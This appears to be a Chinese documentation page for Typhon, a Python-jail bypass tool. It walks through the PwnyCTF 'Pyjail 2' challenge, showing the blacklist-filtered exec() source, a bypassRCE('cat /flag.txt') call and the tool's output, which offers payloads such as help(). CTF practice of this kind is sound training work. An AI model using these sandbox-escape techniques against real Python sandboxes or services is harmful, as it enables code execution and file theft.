EXAMPLE 示例
============

此页用于提供关于 ``Typhon`` 的一些实战例题。

PwnyCTF Pyjail 2
-------------------

题目链接： https://ctf.sigpwny.com/challenges#Vault/Pyjail%202-633

.. code-block:: python
    :linenos:
    :emphasize-lines: 3,26

    #!/usr/bin/env python3

    #Flag is at /flag.txt

    def is_bad(user_input):
        banned = '"*\'`x'

        for c in banned:
            if c in user_input:
                return True
        
        return False


    def main():

        print("You wake up in the jail gym. Your head is still sore from the bonk.")

        user_input = input('What do you have to say for yourself? ')

        if is_bad(user_input):
            print('Sorry, not good enough. Go back to jail.')
            return
        
        try:
            exec(user_input)
            print("Ok, we'll consider it.")
        except:
            print('Sorry, not good enough. Go back to jail.')


    if __name__ == '__main__':
        main()

flag位于 ``/flag.txt`` 文件中。

注意到第25行存在执行函数： ``exec(user_input)``。同时，此题目的WAF有且仅有 ``is_bad()`` 函数，其
功能为检测用户输入是否包含 ``"``、 ``'``、 ``*``、  `````、 ``x``。

此处我们将执行行删去，换为对应的命令。

我们将 ``main()`` 函数改为：

.. code-block:: python
    :linenos:
    :emphasize-lines: 12,13

    def main():

        print("You wake up in the jail gym. Your head is still sore from the bonk.")

        user_input = input('What do you have to say for yourself? ')

        if is_bad(user_input):
            print('Sorry, not good enough. Go back to jail.')
            return
        
        try:
            import Typhon
            Typhon.bypassRCE('cat /flag.txt', banned_chr = '"*\'`x')
            print("Ok, we'll consider it.")
        except:
            print('Sorry, not good enough. Go back to jail.')

运行，随意输入使得控制流进入 ``Typhon.bypassRCE()`` 函数，即可得到flag（在 ``input()`` 时什么都不输入即可）。

.. code-block:: bash

    You wake up in the jail gym. Your head is still sore from the bonk.
    What do you have to say for yourself?

        .-')          _                 Typhon: a pyjail bypassing tool
       (`_^ (    .----`/
        ` )  \_/`   __/     __,    [Typhon Version]: v1.0.10
        __{   |`  __/      /_/     [Python Version]: v3.13.4
       / _{    \__/ '--.  //       [Github]: https://github.com/Team-intN18-SoybeanSeclab/Typhon
       \_> \_\  >__/    \((        [Author]: LamentXU <lamentxu644@gmail.com>
            _/ /` _\_   |))

    WARNING [!] banned_chr should be a list, converting to list for compatibility.
    WARNING [!] local scope not specified, using the global scope.
    INFO [*] 7 paths found to directly getshell. Try to bypass blacklist with them. Please be paitent.
    Bypassing (7/7): [===============================================================================>] 100.0%
    INFO [+] directly getshell success. 49 payload(s) in total.
    INFO [+] You now can use this payload to getshell directly with proper input.




    -----------Progress-----------


    directly input bypass(49 payloads found): help()


    -----------Progress-----------


    +++++++++++Jail broken+++++++++++


    help()


    +++++++++++Jail broken+++++++++++

此时，我们再远程环境中输入 ``help()`` 再利用 `相应的技术 <https://typhonbreaker.readthedocs.io/zh-cn/latest/FAQ.html#id1>`_ 进行绕过即可 。
